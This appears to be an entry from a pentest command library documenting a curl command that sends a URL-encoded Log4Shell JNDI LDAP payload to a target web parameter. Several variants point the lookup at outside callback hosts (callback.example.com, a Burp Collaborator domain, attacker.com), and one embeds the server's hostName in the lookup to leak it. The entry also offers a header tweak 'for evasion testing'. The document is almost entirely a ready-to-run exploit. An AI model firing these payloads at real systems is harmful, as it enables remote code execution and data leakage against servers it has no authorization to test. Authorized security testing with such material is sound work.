---
data: >-
  curl
  "https://target.example/parameter=%24%7bjndi%3aldap%3a%2f%2fcallback.example.com%2fa%7d"
  -v
tags:
  - http
  - rce
  - log4shell
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:50.084Z'
id: 7ead56bf-2636-481a-9e18-019228459d4b
verified: false
validated: true
submitted: true
---
# curl-send-log4shell-payload

## Command

```bash
curl "https://███████/██████=%24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.LOG45200SSRF.xxxxxx.burpcollaborator.net%2fa%7d" -v
```

## Description

This command sends an HTTP GET request to a target URL with a URL-encoded Log4Shell payload in the parameter, triggering the vulnerability in Apache Log4j for JNDI LDAP lookup. Use it to test for RCE in web applications logging unsanitized inputs. The -v flag enables verbose output for debugging.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with encoded payload in parameter | Yes |
| -v, --verbose | Verbose mode to show headers and details | No |

## Examples

### Basic Usage

```bash
curl "https://target/vuln-param=%24%7bjndi%3aldap%3a%2f%2fcallback.com%2fa%7d"
```

Sends the request without verbose output.

### Advanced Usage

```bash
curl -v -H "User-Agent: Test" "https://target/parameter=%24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.attacker.com%2fa%7d"
```

Includes custom headers for evasion testing.

## Expected Output

HTTP response headers and body from the server, typically 200 OK if the endpoint exists. No immediate error; exploitation confirmed via external callback (e.g., DNS resolution). Verbose mode shows full request/response details.

## Related

- [[Related Procedure: Inject-Log4Shell-Payload-into-URL-Parameter]]
